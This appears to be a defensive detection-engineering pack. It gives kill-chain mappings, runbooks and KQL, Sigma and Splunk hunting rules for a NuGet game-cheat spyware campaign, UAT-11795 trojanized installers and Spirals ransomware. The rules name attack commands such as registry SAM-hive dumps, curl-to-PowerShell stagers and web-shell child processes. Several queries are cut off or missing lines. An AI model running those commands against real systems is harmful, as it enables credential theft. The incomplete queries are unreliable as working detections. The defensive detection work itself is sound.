Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Malicious NuGet game-cheat downloader fetches pepesoft.exe from pepegit666 GitHub/Hugging Face · [LLM] UAT-11795 trojanized installer (MobaXterm/WebEx/Zoom/DBeaver/FaceIT) spawning downloader utilities · Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Spirals ransomware: IIS worker (w3wp.exe) spawning shell via ASP.NET web shell · Office app spawning script/LOLBin child process · Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) · PowerShell encoded / obfuscated command · Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — ThreatsDay: Game Cheat Spyware, 24-Hour Ransomware, Chrome Sync Stalking + 12 Mo
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] UAT-11795 curl.exe spawning PowerShell stager (Starland RAT → WLDR agent) · Suspicious browser extension installation · RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] pepesoft.exe screenshot exfiltration via Telegram Bot API / Google Sheets C2 · Beaconing — periodic outbound to small set of destinations
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Spirals ransomware: SAM registry hive dump for credential access · [LLM] Spirals ransomware: bitsadmin.exe masquerade encryptor running outside System32 · Infostealer — non-browser process accessing browser cookie/login DBs · Crypto-wallet file/keystore access by non-wallet process · Remote service execution — PsExec / SMB lateral movement · OAuth consent / suspicious app grant · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft)
Malicious NuGet game-cheat downloader fetches pepesoft.exe from pepegit666 GitHub/Hugging Face AIDelivery High
Hunts the second-stage 'pepesoft.exe' surveillance payload dropped by the 11 malicious NuGet DotnetTool game-cheat packages, or any file pulled from the operator's 'pepegit666' GitHub Releases / Hugging Face infrastructure. Article-specific because both the payload filename and the operator handle are unique to this campaign. Rationale: Both 'pepesoft.exe' (second-stage payload) and 'pepegit666' (operator GitHub/HuggingFace handle) are unique campaign IOCs confirmed by Socket and secondary write-ups; either string is high-fidelity with near-zero benign overlap. Cross-checked against: • https://socket.dev/blog/11-malicious-nuget-tools-pose-as-game-cheats • https://gbhackers.com/11-malicious-nuget-game-cheat-packages/ • https://cybersecuritynews.com/game-fake-cheats-remote-access/
ATT&CKT1204.002 T1105 T1195.002
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A security researcher intentionally detonating the sample in a sandbox
  • An IR analyst copying the recovered payload onto a triage host
  • A malware-analysis VM with the file staged for reverse engineering
  • Threat-intel enrichment tooling caching the sample locally
Response runbook
1) Triage: confirm the writing process is a NuGet DotnetTool / dotnet.exe child and review FileOriginUrl for pepegit666 or huggingface.co. 2) Contain: isolate the host, block pepegit666 GitHub/Hugging Face URLs and hashes, kill pepesoft.exe. 3) Hunt: pivot on the same device for api.telegram.org and sheets.googleapis.com egress (UC2), enumerate other machines that installed the same NuGet package, and audit developer/gamer workstations for the offending .NET CLI tools.
DeviceFileEvents
| where Timestamp > ago(30d)
| where FileName =~ "pepesoft.exe" or FileOriginUrl has "pepegit666"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, FileOriginUrl, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName =~ "pepesoft.exe"
| project TimeGenerated, DvcHostname, TargetFilePath, ActingProcessName, ActingProcessCommandLine, ActorUsername
| order by TimeGenerated desc

pepesoft.exe screenshot exfiltration via Telegram Bot API / Google Sheets C2 AICommand & Control High
Detects the pepesoft.exe surveillance payload beaconing to its operator channels — Telegram Bot API (screenshot exfil), Google Sheets (activation/ban-list), and Hugging Face (config/payload). Article-specific: the process name is the campaign payload and the destinations match the documented C2 design. Rationale: Ties the unique campaign payload name (pepesoft.exe) to its three documented C2 surfaces (Telegram screenshot exfil, Google Sheets licensing/ban-list, Hugging Face config) — the process+destination pair is far higher fidelity than either alone. Sentinel left blank: available ASIM network tables (ImNetworkSession) carry no initiating-process name, so the process↔destination join cannot be expressed cleanly. Cross-checked against: • https://socket.dev/blog/11-malicious-nuget-tools-pose-as-game-cheats • https://cyberpress.org/nuget-packages-deploy-spyware/
ATT&CKT1113 T1102 T1567
Data sourcesNetwork_Traffic.All_Traffic

  • Sandbox detonation generating C2 telemetry
  • Analyst replaying pcap for the campaign in a lab
Response runbook
1) Triage: confirm InitiatingProcessFolderPath is a user/gaming/temp dir and pull the Telegram bot token / chat-id from captured traffic if available. 2) Contain: isolate host, kill pepesoft.exe, block the destinations at proxy for the affected user, revoke any cached game/Google credentials. 3) Hunt: search org-wide for pepesoft.exe writes (UC1) and other hosts beaconing to the same Telegram bot endpoint; review screen-capture artifacts and clipboard/keylog persistence.

| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort
| order by Timestamp desc

UAT-11795 curl.exe spawning PowerShell stager (Starland RAT → WLDR agent) AIInstallation High
Detects the documented UAT-11795 execution step where Starland RAT uses curl.exe to fetch and launch a PowerShell stager that decrypts and runs the WLDR C2 memory implant. The curl.exe→powershell.exe parent/child chain is rare in benign use and specific to this actor's loader. Rationale: Talos explicitly documents UAT-11795 running curl to download and execute PowerShell WLDR payloads; curl.exe as the direct parent of powershell.exe is an uncommon, high-signal chain that isolates this loader without relying on encoded-PowerShell logic. Cross-checked against: • https://blog.talosintelligence.com/uat-11795-deploys-novel-starland-rat-and-bespoke-wldr-c2-implant-in-financially-motivated-campaign/ • https://www.bleepingcomputer.com/news/security/russian-hackers-trojanize-webex-zoom-apps-to-push-starland-malware/
ATT&CKT1059.001 T1105
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A build/CI script that curls a bootstrap .ps1 and pipes it to PowerShell
  • DevOps tooling using curl to fetch a script then invoking pwsh
  • A packaged installer that legitimately chains curl → PowerShell for post-install config
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("jenkins","\\agent\\","azure-pipelines","gitlab-runner"))
Response runbook
1) Triage: decode the child PowerShell command line and the curl URL; check for beaconing/Runspace/encrypted-blob indicators of the WLDR agent. 2) Contain: isolate host, kill the process tree, block the curl-fetched C2 URL, capture memory for the fileless WLDR implant. 3) Hunt: look for the trojanized-installer parent (MobaXterm/WebEx/Zoom/DBeaver/FaceIT — UC4), Remcos/CastleStealer artifacts, and AD-recon or wallet-file access consistent with UAT-11795.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName =~ "curl.exe"
| where FileName in~ ("powershell.exe","pwsh.exe")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, InitiatingProcessParentFileName, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ParentProcessName has "curl.exe"
| where ActingProcessName has_any ("powershell.exe","pwsh.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

UAT-11795 trojanized installer (MobaXterm/WebEx/Zoom/DBeaver/FaceIT) spawning downloader utilities AIDelivery Medium
Detects trojanized installer lures impersonating MobaXterm, WebEx, Zoom, DBeaver or FaceIT spawning curl/PowerShell/mshta/script hosts — behaviour the genuine installers do not exhibit. Article-specific: these are the exact software brands UAT-11795 trojanizes to deliver Starland RAT. Rationale: Talos/BleepingComputer confirm UAT-11795 trojanizes exactly these five software brands; genuine installers for them do not spawn curl/mshta/script hosts, making the parent-brand + downloader-child pair a targeted (if hunting-tier) delivery detection. Cross-checked against: • https://blog.talosintelligence.com/uat-11795-deploys-novel-starland-rat-and-bespoke-wldr-c2-implant-in-financially-motivated-campaign/ • https://www.bleepingcomputer.com/news/security/russian-hackers-trojanize-webex-zoom-apps-to-push-starland-malware/
ATT&CKT1036.005 T1204.002
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Zoom/WebEx auto-updaters legitimately invoking PowerShell for config
  • A managed-deployment wrapper (SCCM/Intune) installing DBeaver via a PowerShell app-install script
  • MobaXterm portable edition launching helper scripts
  • Corporate FaceIT/anti-cheat client updating via scripted tasks
Suppression filter
| where not (InitiatingProcessFolderPath has_any (@"\Program Files\", @"\Program Files (x86)\") and FileName in~ ("powershell.exe","pwsh.exe"))
Response runbook
1) Triage: verify installer digital signature and download source; inspect the child command line for a curl/mshta URL. 2) Contain: if unsigned or from a non-vendor URL, isolate host, block the URL, and kill the tree. 3) Hunt: pivot to curl→PowerShell (UC3) on the same host, hunt for the same installer hash org-wide, and check for ClickFix HTA artifacts and Remcos/CastleStealer.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName has_any ("mobaxterm","webex","zoom","dbeaver","faceit")
| where FileName in~ ("curl.exe","powershell.exe","pwsh.exe","mshta.exe","wscript.exe","cscript.exe")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ParentProcessName has_any ("mobaxterm","webex","zoom","dbeaver","faceit")
| where ActingProcessName has_any ("curl.exe","powershell.exe","pwsh.exe","mshta.exe","wscript.exe","cscript.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

Spirals ransomware: IIS worker (w3wp.exe) spawning shell via ASP.NET web shell AIExploitation High
Detects the Spirals initial-access step — an ASP.NET web shell on an internet-facing IIS server — by flagging the IIS worker process w3wp.exe spawning command shells or recon/download LOLBins. Article-specific: Symantec attributes Spirals' entry to an ASP.NET web shell dropped on a compromised IIS server. Rationale: Symantec documents Spirals gaining entry via an ASP.NET web shell on an internet-facing IIS server; w3wp.exe spawning cmd/powershell/recon LOLBins is the canonical, high-fidelity server-side web-shell signal and is not covered by generic Office-spawn or LSASS rules. Cross-checked against: • https://www.security.com/threat-intelligence/ransomware-spirals-extortion • https://www.bleepingcomputer.com/news/security/new-spirals-ransomware-encrypts-victim-network-in-under-24-hours/
ATT&CKT1505.003 T1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A web app legitimately shelling out to net.exe for a scheduled maintenance task
  • An IIS-hosted admin panel invoking PowerShell for on-box automation
  • Application-pool recycling scripts that call reg.exe
  • Monitoring agents launched under the IIS identity
Response runbook
1) Triage: capture the child command line and identify the source .aspx/.ashx web-shell file under the site root via recent DeviceFileEvents writes by w3wp.exe. 2) Contain: take the IIS server offline or block inbound, remove the web shell, preserve IIS logs and the SAM/registry hives. 3) Hunt: on that host look for SAM-hive dump (UC6), EDR-uninstall activity, and bitsadmin.exe ransomware masquerade (UC7); given the sub-24h timeline, treat as active ransomware and check PsExec-driven spread to other hosts.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName =~ "w3wp.exe"
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","net.exe","net1.exe","whoami.exe","bitsadmin.exe","certutil.exe","reg.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ParentProcessName has "w3wp.exe"
| where ActingProcessName has_any ("cmd.exe","powershell.exe","pwsh.exe","net.exe","net1.exe","whoami.exe","bitsadmin.exe","certutil.exe","reg.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessCommandLine
| order by TimeGenerated desc

Spirals ransomware: SAM registry hive dump for credential access AIActions on Objectives High
Detects the Spirals credential-access step — dumping the SAM hive within the initial ~3-hour hands-on-keyboard window. Flags reg.exe save of SAM/SYSTEM/SECURITY hives and esentutl/PowerShell hive extraction. Article-specific: Symantec states the actor dumped the SAM hive prior to network-wide deployment. Rationale: Symantec explicitly lists SAM-hive dumping in the Spirals intrusion; 'reg save hklm\sam' and esentutl SAM extraction are precise, LOLBin-based credential-dump commands distinct from LSASS-access rules already deployed. Cross-checked against: • https://www.security.com/threat-intelligence/ransomware-spirals-extortion • https://www.bleepingcomputer.com/news/security/new-spirals-ransomware-encrypts-victim-network-in-under-24-hours/

Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Sysadmin backing up a registry hive before a change
  • Forensic/IR tooling exporting SAM/SYSTEM for offline analysis
  • Migration tooling reading hives during OS deployment
  • A legitimate password-audit process extracting hives with change-control approval
Suppression filter
| where not (InitiatingProcessFileName in~ ("backup.exe","veeam.backup.shell.exe") or InitiatingProcessCommandLine has "ChangeControl")
Response runbook
1) Triage: confirm the user context and parent process (web shell / interactive admin) and whether the save target is a temp/staging path. 2) Contain: force-reset local account and any cached domain credentials, isolate host, preserve the dumped hive files. 3) Hunt: this is a Spirals mid-chain marker — pivot to the w3wp.exe web shell (UC5), EDR-uninstall events, and bitsadmin.exe ransomware masquerade (UC7); assume imminent network-wide encryption given the <24h timeline.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where AccountName !endswith "$"
| where (FileName =~ "reg.exe" and ProcessCommandLine has "save" and ProcessCommandLine has_any ("hklm\\sam","hklm\\system","hklm\\security"))
    or (FileName =~ "esentutl.exe" and ProcessCommandLine has_any ("\\config\\SAM","/vss"))
    or (FileName in~ ("powershell.exe","pwsh.exe") and ProcessCommandLine has_any ("reg save","reg.exe save","\\config\\SAM"))
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where (NewProcessName endswith "\\reg.exe" and CommandLine has "save" and CommandLine has_any ("hklm\\sam","hklm\\system","hklm\\security"))
    or (NewProcessName endswith "\\esentutl.exe" and CommandLine has_any ("\\config\\SAM","/vss"))
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc
title: SAM Hive Dump via reg.exe save (Spirals Credential Access)
id: f8c6b7d9-6071-42a3-de45-66f708192a3b
description: Detects reg.exe saving the SAM/SYSTEM/SECURITY hives, the credential-dump step observed in the Spirals ransomware intrusion.
references:
  - https://www.security.com/threat-intelligence/ransomware-spirals-extortion
author: SOC Detection Engineering
date: 2026/07/16
tags:
  - attack.t1003.002
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\reg.exe'
    CommandLine|contains: 'save'
    CommandLine|contains:
      - 'hklm\sam'
      - 'hklm\system'
      - 'hklm\security'
  condition: selection
level: high
source:windows.sysmon @EventID:1 @Image:(*\\reg.exe OR *\\REG.EXE) @CommandLine:(*save* OR *SAVE*) @CommandLine:(*hklm\\sam* OR *HKLM\\SAM* OR *hklm\\system* OR *HKLM\\SYSTEM* OR *hklm\\security* OR *HKLM\\SECURITY*)
#event_simpleName=ProcessRollup2 ImageFileName=/\\reg\.exe$/i | CommandLine=/save/i | CommandLine=/hklm\\(sam|system|security)/i | groupBy([aid, ComputerName, CommandLine], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where ((Processes.process_name="reg.exe" AND Processes.process="*save*" AND (Processes.process="*hklm\\sam*" OR Processes.process="*hklm\\system*" OR Processes.process="*hklm\\security*")) OR (Processes.process_name="esentutl.exe" AND Processes.process="*\\config\\SAM*")) by Processes.dest Processes.user Processes.process_name Processes.process 
| `drop_dm_object_name(Processes)` 
| `security_content_ctime(firstTime)` 
| `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where ((Processes.process_name="reg.exe" AND Processes.process="*save*" AND (Processes.process="*hklm\\sam*" OR Processes.process="*hklm\\system*" OR Processes.process="*hklm\\security*")) OR (Processes.process_name="esentutl.exe" AND Processes.process="*\\config\\SAM*")) by Processes.dest Processes.user Processes.process_name Processes.process 
| `drop_dm_object_name(Processes)` 
| `security_content_ctime(firstTime)` 
| `security_content_ctime(lastTime)`
Spirals ransomware: bitsadmin.exe masquerade encryptor running outside System32 AIActions on Objectives High
Detects the Spirals Rust-based ransomware payload, which was deployed as 'bitsadmin.exe' to masquerade as the legitimate BITS utility. Flags any bitsadmin.exe executing from a path other than System32/SysWOW64 — a location the genuine Windows binary never runs from. This is the impact-phase encryptor pivot. Rationale: Symantec/BleepingComputer confirm the Spirals encryptor was deployed named bitsadmin.exe via PsExec as SYSTEM to masquerade as the legitimate BITS tool; the genuine bitsadmin.exe only ever runs from System32/SysWOW64, so a copy elsewhere is a near-zero-FP ransomware-payload indicator. Detection intentionally avoids the excluded PsExec-lateral logic and pivots on the masquerade instead. Cross-checked against: • https://www.security.com/threat-intelligence/ransomware-spirals-extortion • https://www.bleepingcomputer.com/news/security/new-spirals-ransomware-encrypts-victim-network-in-under-24-hours/
ATT&CKT1036.005 T1486
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A portable admin toolkit shipping a copy of bitsadmin.exe in a non-standard folder
  • Software packaging that stages bitsadmin.exe under Program Files for redistribution
  • A backup/imaging solution bundling BITS tooling
  • Legacy app installers copying bitsadmin.exe to their own directory
Suppression filter
| where not (FolderPath has_any (@"\Program Files\", @"\Program Files (x86)\") and InitiatingProcessFileName in~ ("msiexec.exe","setup.exe"))
Response runbook
1) Triage: hash the binary and compare to the Microsoft-signed bitsadmin (mismatch = malicious); check for concurrent mass DeviceFileEvents FileModified/FileRenamed bursts by the same process. 2) Contain: isolate host immediately, kill the process, and quarantine the sample — treat as active encryption. 3) Hunt: enumerate every host where this bitsadmin.exe hash/path appears (PsExec-driven spread), verify backups/VSS integrity, and correlate with the Spirals web-shell (UC5) and SAM dump (UC6) upstream.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "bitsadmin.exe"
| where FolderPath !contains "\\windows\\system32\\" and FolderPath !contains "\\windows\\syswow64\\"
| project Timestamp, DeviceName, AccountName, FolderPath, ProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine, ProcessIntegrityLevel
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName endswith "\\bitsadmin.exe"
| where NewProcessName !has "\\System32\\" and NewProcessName !has "\\SysWOW64\\"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName, TokenElevationType
| order by TimeGenerated desc
title: bitsadmin.exe Executing Outside System32 (Spirals Ransomware Masquerade)
id: 09d7c8ea-7182-43b4-ef56-7708192a3b4c
description: Detects a bitsadmin.exe binary running from a non-System32/SysWOW64 path, matching the Spirals Rust ransomware payload masquerading as the BITS utility.
references:
  - https://www.security.com/threat-intelligence/ransomware-spirals-extortion
author: SOC Detection Engineering
date: 2026/07/16
tags:
  - attack.t1036.005
  - attack.t1486
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\bitsadmin.exe'
  filter_legit:
    Image|contains:
      - '\System32\'
      - '\SysWOW64\'
  condition: selection and not filter_legit
level: high
source:windows.sysmon @EventID:1 @Image:(*\\bitsadmin.exe OR *\\BitsAdmin.exe OR *\\BITSADMIN.EXE) -@Image:(*\\System32\\* OR *\\system32\\* OR *\\SysWOW64\\* OR *\\syswow64\\*)
#event_simpleName=ProcessRollup2 ImageFileName=/\\bitsadmin\.exe$/i | NOT ImageFileName=/\\(System32|SysWOW64)\\/i | groupBy([aid, ComputerName, ImageFileName, CommandLine, ParentBaseFileName], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name="bitsadmin.exe" NOT (Processes.process_path="*\\System32\\*" OR Processes.process_path="*\\SysWOW64\\*") by Processes.dest Processes.user Processes.process_path Processes.process Processes.parent_process_name 
| `drop_dm_object_name(Processes)` 
| `security_content_ctime(firstTime)` 
| `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name="bitsadmin.exe" NOT (Processes.process_path="*\\System32\\*" OR Processes.process_path="*\\SysWOW64\\*") by Processes.dest Processes.user Processes.process_path Processes.process Processes.parent_process_name 
| `drop_dm_object_name(Processes)` 
| `security_content_ctime(firstTime)` 
| `security_content_ctime(lastTime)`
Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.

| streamstats current=f last(_time) AS prev_time by src, dest

| sort - count

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

     | `drop_dm_object_name(All_Email)`

| join type=inner src
    [| tstats summariesonly=false earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",

                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time

| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
